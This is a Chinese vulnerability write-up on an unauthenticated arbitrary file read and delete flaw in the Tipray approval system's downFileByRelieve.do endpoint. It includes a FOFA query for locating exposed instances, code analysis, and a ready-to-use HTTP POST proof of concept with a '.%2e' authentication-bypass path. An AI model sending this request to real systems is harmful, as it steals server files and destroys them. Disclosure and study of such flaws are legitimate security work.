---
title: "天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞"
source: https://mrxn.net/jswz/trwfe-downFileByRelieve-file-read.html
asset_dir: assets/天锐绿盾审批系统-downfilebyrelieve.do-任意文件读取+删除漏洞
---

# 天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/15 08:31
- 356浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

编程语言教程

传输层安全性协议

文件大小转换

---

# 漏洞简介

天锐绿盾审批系统是一款专注于企业数据安全与合规管理的智能审批平台，深度融合文档加密、权限管控与流程自动化，为企业提供从文件创建、流转到归档的全生命周期安全管控。

漏洞预警服务

该系统的 `downFileByRelieve.do` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。未经身份验证的攻击者可以通过该漏洞读取系统上的任意文件，从而可能获取数据库敏感信息或其他重要配置信息，导致数据泄露。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> Windows安全工具

# 漏洞分析

先看`downFileByRelieve.do`的实现

[![天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞](images/img-001-2574ea71af4e.webp)](https://image.mrxn.net/0260bd53a2494b41941e1b3845c22ace.webp)

最终都会删除传入的文件

计算机安全

[![天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞](images/img-002-19375c371531.webp)](https://image.mrxn.net/ae95a70abe194652a1bd0639667f25cf.webp)

跟进`fileService.downLoadFile` 方法，看下`fileService.downLoadFile`的实现逻辑

[![天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞](images/img-003-23c978e49e20.webp)](https://image.mrxn.net/2baddfb1752a4fd195376a893e5589ea.webp)

**直接将从用户端接收的** `dstPaths` **参数，不经验证地用于** `new FileInputStream(((DownFileMsg)files.get(0)).getFile())` **来实例化文件对象，并最终传递给** `FileInputStream` **进行[读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)**，攻击者可以构造包含绝对路径或 `../` 目录遍历序列的恶意 `dstPath` 参数，读取服务器文件系统上任意位置的、具有应用运行权限可读的任何文件。

漏洞预警服务

深入探索

安全

VPN服务

网络安全培训

`fileService.downLoadFile`最终会删除读取的文件

[![天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞](images/img-004-01bb223800f3.webp)](https://image.mrxn.net/f35530639875416e9beffd9d243300d5.webp)

测试时应该谨慎测试，最好自己上传一个文件来测试，避免删除了系统重要文件导致系统宕机的尴尬。

网络安全

# 漏洞复现

> 漏洞测试会删除对应文件，谨慎测试

```
POST /trwfe/login.jsp/.%2e/file/downFileByRelieve.do HTTP/1.1
Host: trwfe.mrxn.net
Content-Type: application/x-www-form-urlencoded

dstPaths=c:\a.txt&fileNames=1.png&isDirArr=0&processInstanceIds=&isapproval=auto
```

成功读取到`c:\a.txt`文件内容

[![天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞](images/img-005-363478099ea0.webp)](https://image.mrxn.net/18279c4eecec4a10b93651585430d5f3.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
